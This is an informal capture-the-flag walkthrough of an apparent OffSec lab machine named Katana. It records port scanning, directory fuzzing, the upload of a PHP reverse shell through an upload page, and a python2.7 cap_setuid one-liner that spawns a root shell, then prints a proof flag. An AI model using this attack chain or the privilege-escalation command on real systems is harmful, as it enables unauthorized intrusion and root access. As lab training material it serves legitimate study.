offsec
target : 192.168.215.83
first day, No WriteUP for easy machine
Tips:  scan also for html file using -e for extension
Tips: use dirb for extension scanning
nmap scan 
└─# nmap -sV -A -Pn -p- --min-rate 5000 192.168.215.83     
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 894f3a5401f8dcb66ee078fc60a6de35 (RSA)
|   256 ddaccc4e43816be32df312a13e4ba322 (ECDSA)
|_  256 cce625c0c6119f88f6c4261edefae98b (ED25519)
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-title: Katana X
7080/tcp open  ssl/empowerid LiteSpeed
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
|_http-server-header: LiteSpeed
|_ssl-date: TLS randomness does not represent time
8088/tcp open  http          LiteSpeed httpd
|_http-title: Katana X
8715/tcp open  http          nginx 1.14.2
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content

found a web page on it http://192.168.215.83/ i run ffuf on it but nothing 
but it's same with the 8088 nut the server is not same .
now i run also on it and found 
 :: Method           : GET
 :: URL              : http://192.168.215.83:8088/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 655, Words: 51, Lines: 24]
.htaccess               [Status: 403, Size: 1227, Words: 107, Lines: 15]
blocked                 [Status: 301, Size: 1260, Words: 109, Lines: 15]
cgi-bin                 [Status: 301, Size: 1260, Words: 109, Lines: 15]
css                     [Status: 301, Size: 1260, Words: 109, Lines: 15]
docs                    [Status: 301, Size: 1260, Words: 109, Lines: 15]
img                     [Status: 301, Size: 1260, Words: 109, Lines: 15]
index.html              [Status: 200, Size: 655, Words: 51, Lines: 24]
phpinfo.php             [Status: 200, Size: 50771, Words: 2409, Lines: 494]
protected               [Status: 301, Size: 1260, Words: 109, Lines: 15]

i will now scan for html extension
└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.221.83:8088/FUZZ -e html    
nothing i will use dirb
└─# dirb http://192.168.221.83:8088/ -X .html
found http://192.168.221.83:8088/upload.html

uploaded and i go in all port to find my submit shell
http://192.168.221.83:8088/katana_reverse_shell.php nothing and then i go in 8715 and found it

PrivEsc
 i found nothing using the SUID and sudo now i try capabilities
 www-data@katana:/tmp/priv$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
www-data@katana:/tmp/priv$ 

i found python now i go to gtfobins and found something
python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'

root@katana:/root# cat proof.txt 
c4d730623ee916b4c45cf445da5fd716
root@katana:/root# cat root.txt 
Your flag is in another file...
local.txt is the first flag i need to find 
/var/www/local.txt